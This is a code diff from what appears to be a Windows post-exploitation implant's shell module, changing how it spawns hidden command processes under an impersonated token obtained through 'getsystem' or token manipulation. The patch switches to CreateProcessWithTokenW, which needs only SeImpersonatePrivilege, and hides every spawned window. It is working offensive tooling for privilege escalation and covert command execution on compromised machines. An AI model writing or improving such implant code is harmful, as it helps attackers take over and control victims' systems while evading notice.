@@ -471,19 +471,19 @@ static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershel
 
     /*
      * If the thread is impersonating (getsystem / tokenmanip), use
-     * CreateProcessAsUserW so the child inherits the impersonated
-     * identity.  Fall back to plain CreateProcessA when not impersonating.
+     * CreateProcessWithTokenW so the child runs as the impersonated
+     * identity.  Only needs SeImpersonatePrivilege (admins have it).
+     * Fall back to plain CreateProcessA when not impersonating.
      */
     BOOL spawned = FALSE;
     HANDLE hThreadToken = NULL;
     if (OpenThreadToken(GetCurrentThread(),
                         TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                         FALSE, &hThreadToken)) {
-        /* Duplicate as a primary token — CreateProcessAsUserW needs one */
+        /* Duplicate as a primary token — CreateProcessWithTokenW needs one */
         HANDLE hPrimary = NULL;
         if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
                              SecurityImpersonation, TokenPrimary, &hPrimary)) {
-            /* CreateProcessAsUserW requires wide strings */
             WCHAR wCmd[8192];
             MultiByteToWideChar(CP_UTF8, 0, full_cmd, -1, wCmd, 8192);
 
@@ -496,12 +496,20 @@ static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershel
             siw.hStdInput  = NULL;
             siw.wShowWindow = SW_HIDE;
 
-            spawned = CreateProcessAsUserW(
-                hPrimary, NULL, wCmd, NULL, NULL, TRUE,
-                CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);
+            /* CreateProcessWithTokenW — seclogon service handles duplicating
+             * the pipe handles into the new process internally. */
+            spawned = CreateProcessWithTokenW(
+                hPrimary,
+                0,             /* dwLogonFlags: 0 = no profile load */
+                NULL,          /* lpApplicationName */
+                wCmd,          /* lpCommandLine */
+                CREATE_NO_WINDOW,
+                NULL,          /* lpEnvironment */
+                NULL,          /* lpCurrentDirectory */
+                &siw, &pi);
 
             if (!spawned) {
-                DBG("[shell] CreateProcessAsUserW failed (err=%lu), falling back",
+                DBG("[shell] CreateProcessWithTokenW failed (err=%lu), falling back",
                     GetLastError());
             }
             CloseHandle(hPrimary);
